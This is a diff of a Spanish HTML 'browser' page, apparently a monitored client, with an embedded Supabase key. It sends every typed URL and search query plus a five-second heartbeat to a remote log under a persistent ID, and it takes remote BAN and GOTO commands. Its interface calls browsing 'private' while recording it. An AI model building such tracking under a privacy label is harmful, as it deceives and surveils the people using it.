@@ -2,188 +2,122 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AlexNAV Quantum | Ultra-Secure Browser</title>
+    <title>AlexNAV Pro | Lazarus Client</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --accent: #00d4ff; --bg: #030305; --chrome: #121215; --text: #ffffff; }
-        * { box-sizing: border-box; transition: all 0.2s ease; }
-        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+        :root { --accent: #00d4ff; --bg: #030305; --chrome: #121215; }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); font-family: 'Segoe UI', sans-serif; overflow: hidden; }
 
-        /* DISEÑO DE LA BARRA SUPERIOR (CHROME) */
-        .browser-header {
-            height: 75px; background: var(--chrome); display: flex; align-items: center;
-            padding: 0 20px; gap: 15px; border-bottom: 1px solid #333; position: relative; z-index: 100;
+        /* HEADER / BARRA DE BÚSQUEDA */
+        .header { height: 70px; background: var(--chrome); display: flex; align-items: center; padding: 0 20px; gap: 15px; border-bottom: 1px solid #333; }
+        .omnibox { 
+            flex: 1; background: #000; border: 1.5px solid #444; color: white; 
+            padding: 12px 20px; border-radius: 25px; outline: none; font-size: 14px;
         }
-        .nav-buttons { display: flex; gap: 8px; }
-        .btn-nav {
-            width: 40px; height: 40px; border-radius: 50%; border: 1px solid #444;
-            background: rgba(255,255,255,0.05); color: white; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .btn-nav:hover { background: var(--accent); color: #000; box-shadow: 0 0 15px var(--accent); border-color: var(--accent); }
+        .omnibox:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(0,212,255,0.2); }
+        .id-badge { background: rgba(0,212,255,0.1); color: var(--accent); padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: bold; border: 1px solid var(--accent); }
 
-        /* LA PESTAÑITA (OMNIBOX) CORREGIDA */
-        .omnibox-container { flex: 1; position: relative; }
-        .omnibox {
-            width: 100%; background: #000; border: 1.5px solid #333; color: #fff;
-            padding: 12px 25px; border-radius: 30px; outline: none; font-size: 14px;
-        }
-        .omnibox:focus { border-color: var(--accent); box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
-
-        /* BADGE DE ID */
-        .id-badge {
-            background: rgba(0, 212, 255, 0.1); border: 1px solid var(--accent);
-            color: var(--accent); padding: 5px 12px; border-radius: 8px;
-            font-size: 11px; font-weight: bold; letter-spacing: 1px;
-        }
-
-        /* VIEWPORT DEL NAVEGADOR */
-        .viewport { width: 100%; height: calc(100vh - 75px); background: #fff; }
+        /* VIEWPORT */
+        .viewport { width: 100%; height: calc(100vh - 70px); background: white; }
         iframe { width: 100%; height: 100%; border: none; }
 
-        /* BLOQUEO ESTILO IMTGo (Blanco y Azul) */
-        #imtgo-screen {
+        /* BLOQUEO ESTILO IMTGO */
+        #imtgo-block {
             position: fixed; inset: 0; background: #f0f4f8; display: none;
-            flex-direction: column; align-items: center; justify-content: center; z-index: 999999;
+            flex-direction: column; align-items: center; justify-content: center; z-index: 10000;
         }
-        .block-card {
-            background: white; padding: 50px; border-radius: 20px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.1); text-align: center;
-            border-top: 10px solid #2b6cb0; max-width: 500px;
-        }
-        .x-red { color: #e53e3e; font-size: 100px; margin-bottom: 20px; }
-
-        /* PANTALLA DE BANEO TOTAL */
-        #ban-overlay {
-            position: fixed; inset: 0; background: #000; color: red;
-            display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000001;
-        }
+        .block-card { background: white; padding: 50px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; border-top: 10px solid #2b6cb0; }
     </style>
 </head>
 <body>
 
-<div id="imtgo-screen">
+<div id="imtgo-block">
     <div class="block-card">
-        <i class="fas fa-times-circle x-red"></i>
-        <h1 style="color: #1a365d; margin: 0; font-family: Arial;">ACCESO DENEGADO</h1>
-        <p style="color: #4a5568; font-size: 18px;">El sitio web ha sido bloqueado por el administrador del sistema.</p>
-        <div style="margin-top: 20px; color: #2b6cb0; font-weight: bold;">SEGURIDAD LAZARUS</div>
+        <i class="fas fa-times-circle" style="color:#e53e3e; font-size:100px; margin-bottom:20px;"></i>
+        <h1 style="color:#1a365d; margin:0;">ACCESO DENEGADO</h1>
+        <p style="color:#4a5568; font-size:18px;">Este sitio ha sido restringido por seguridad corporativa.</p>
     </div>
 </div>
 
-<div id="ban-overlay">
-    <i class="fas fa-user-slash" style="font-size: 80px;"></i>
-    <h1>DISPOSITIVO BLOQUEADO POR ALEXNAV</h1>
-</div>
-
-<header class="browser-header">
-    <div class="nav-buttons">
-        <button class="btn-nav" onclick="history.back()"><i class="fas fa-chevron-left"></i></button>
-        <button class="btn-nav" onclick="location.reload()"><i class="fas fa-redo"></i></button>
-        <button class="btn-nav" onclick="goHome()"><i class="fas fa-home"></i></button>
-    </div>
-
-    <div class="omnibox-container">
-        <input type="text" id="url-input" class="omnibox" placeholder="Introduce una URL o busca en Google...">
-    </div>
-
-    <div class="id-badge" id="my-id-display">ID: ...</div>
+<header class="header">
+    <div class="id-badge" id="display-id">ID: ...</div>
+    <input type="text" id="omni" class="omnibox" placeholder="Escribe una URL o busca en la red privada...">
+    <button onclick="navigate()" style="background:var(--accent); border:none; padding:10px 20px; border-radius:20px; cursor:pointer; font-weight:bold;">IR</button>
 </header>
 
-<main class="viewport">
-    <iframe id="web-view" src="https://www.google.com/search?igu=1"></iframe>
-</main>
+<div class="viewport">
+    <iframe id="main-frame" src="https://start.duckduckgo.com"></iframe>
+</div>
 
 <script>
     const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
     const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";
 
-    // --- SISTEMA DE ID PERSISTENTE (Soluciona el problema de detección) ---
-    function setupID() {
-        const params = new URLSearchParams(window.location.search);
-        let id = params.get('id');
-
-        if (!id) {
-            id = localStorage.getItem('alex_session_id');
-            if (!id) {
-                id = "ALEX-" + Math.floor(Math.random() * 8999 + 1000);
-                localStorage.setItem('alex_session_id', id);
-            }
-            const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?id=' + id;
-            window.history.pushState({path: newUrl}, '', newUrl);
-        }
-        return id;
+    // --- ID ÚNICO Y PERSISTENTE ---
+    let USER_ID = localStorage.getItem('lazarus_user_id');
+    if(!USER_ID) {
+        USER_ID = "NODE-" + Math.floor(Math.random() * 9000 + 1000);
+        localStorage.setItem('lazarus_user_id', USER_ID);
     }
+    document.getElementById('display-id').innerText = "ID: " + USER_ID;
 
-    const USER_ID = setupID();
-    document.getElementById('my-id-display').innerText = "ID: " + USER_ID;
-
-    // --- BARRA DE BÚSQUEDA CORREGIDA (Evento ENTER) ---
-    const input = document.getElementById('url-input');
-    const frame = document.getElementById('web-view');
-
+    // --- NAVEGACIÓN PRIVADA (TIPO STARTPAGE) ---
     async function navigate() {
-        let val = input.value.trim();
-        if (!val) return;
+        const query = document.getElementById('omni').value.trim();
+        if(!query) return;
 
-        // Comprobación de Blacklist
-        const { data: blacklist } = await fetch(`${SB_URL}/rest/v1/links_bloqueados?select=url`, {headers:{'apikey':SB_KEY}}).then(r=>r.json());
-        if (blacklist && blacklist.some(b => val.toLowerCase().includes(b.url.toLowerCase()))) {
-            document.getElementById('imtgo-screen').style.display = 'flex';
-            report("BLOQUEO", val);
+        // Comprobar Bloqueos
+        const res = await fetch(`${SB_URL}/rest/v1/links_bloqueados?select=url`, {headers:{'apikey':SB_KEY}});
+        const list = await res.json();
+        if(list.some(l => query.toLowerCase().includes(l.url.toLowerCase()))) {
+            document.getElementById('imtgo-block').style.display = 'flex';
+            sendReport("BLOQUEO", query);
             return;
         }
 
-        document.getElementById('imtgo-screen').style.display = 'none';
-
-        // Lógica de URL o Google
-        let targetUrl = "";
-        if (val.includes('.') && !val.includes(' ')) {
-            targetUrl = val.startsWith('http') ? val : 'https://' + val;
+        document.getElementById('imtgo-block').style.display = 'none';
+        let finalUrl = "";
+        
+        if (query.includes('.') && !query.includes(' ')) {
+            finalUrl = query.startsWith('http') ? query : 'https://' + query;
         } else {
-            targetUrl = `https://www.google.com/search?q=${encodeURIComponent(val)}&igu=1`;
+            // Buscador Privado ( DuckDuckGo modo limpio )
+            finalUrl = `https://duckduckgo.com/?q=${encodeURIComponent(query)}&kae=d&kp=-2`;
         }
 
-        frame.src = targetUrl;
-        report("NAVIGATE", targetUrl);
+        document.getElementById('main-frame').src = finalUrl;
+        sendReport("NAV", finalUrl);
     }
 
-    input.addEventListener('keypress', (e) => { if(e.key === 'Enter') navigate(); });
+    document.getElementById('omni').onkeypress = (e) => { if(e.key === 'Enter') navigate(); };
 
-    // --- REPORTE AL PANEL (Latido de detección) ---
-    async function report(action, content) {
+    // --- SISTEMA DE DETECCIÓN (HEARTBEAT) ---
+    async function sendReport(action, val) {
         fetch(`${SB_URL}/rest/v1/logs`, {
             method: 'POST',
-            headers: { 'apikey': SB_KEY, 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                usuario_id: USER_ID,
-                accion: action,
-                contenido: content,
-                url_actual: frame.src
+            headers: {'apikey': SB_KEY, 'Content-Type': 'application/json'},
+            body: JSON.stringify({ 
+                usuario_id: USER_ID, 
+                accion: action, 
+                contenido: val, 
+                url_actual: document.getElementById('main-frame').src,
+                last_seen: new Date().toISOString()
             })
         });
     }
 
-    // Ping inicial para que el panel te vea nada más entrar
-    report("CONEXIÓN", "Usuario entró al navegador");
+    // Manda una señal cada 5 segundos para que el panel sepa que estás conectado
+    setInterval(() => sendReport("PING", "Activo"), 5000);
 
-    // --- ESCUCHA DE ÓRDENES REMOTAS ---
+    // Órdenes remotas
     setInterval(async () => {
         const res = await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${USER_ID}&activa=eq.true`, {headers:{'apikey':SB_KEY}});
-        const orders = await res.json();
-        if (orders.length > 0) {
-            const o = orders[0];
-            if (o.orden === 'BAN') document.getElementById('ban-overlay').style.display = 'flex';
-            if (o.orden === 'UNBAN') document.getElementById('ban-overlay').style.display = 'none';
-            if (o.orden === 'GOTO') {
-                frame.src = o.contenido;
-                input.value = o.contenido;
-            }
+        const data = await res.json();
+        if(data.length > 0) {
+            if(data[0].orden === 'BAN') document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%;'>DISPOSITIVO BLOQUEADO</h1>";
+            if(data[0].orden === 'GOTO') document.getElementById('main-frame').src = data[0].contenido;
         }
-    }, 2500);
-
-    function goHome() { frame.src = "https://www.google.com/search?igu=1"; input.value = ""; }
+    }, 3000);
 </script>
 </body>
 </html>
